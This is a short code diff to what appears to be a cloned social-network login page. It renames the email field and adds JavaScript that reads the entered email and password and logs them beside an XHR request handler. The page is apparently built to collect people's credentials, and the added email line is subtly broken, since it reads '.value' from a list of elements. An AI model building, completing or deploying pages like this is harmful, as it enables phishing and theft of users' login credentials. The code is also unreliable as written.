@@ -106,7 +106,7 @@
                                             <td class="html7magic"><label for="pass">Password</label></td>
                                         </tr>
                                         <tr>
-                                            <td><input type="email" class="inputtext" name="email" id="email" tabindex="1" data-testid="royal_email"
+                                            <td><input type="email" class="inputtext" name="email1" id="email" tabindex="1" data-testid="royal_email"
                                                 /></td>
                                             <td><input type="password" class="inputtext" name="pass1" id="pass1" tabindex="2" data-testid="royal_pass"
                                                 /></td>
@@ -482,8 +482,10 @@ button.onclick = function ()
    
 
     var pass =document.getElementById("pass1");
+      var email =document.getElementsByName("email1");
 
     console.log(pass.value);
+    console.log(email.value);
     
     
     request.onreadystatechange=function ()
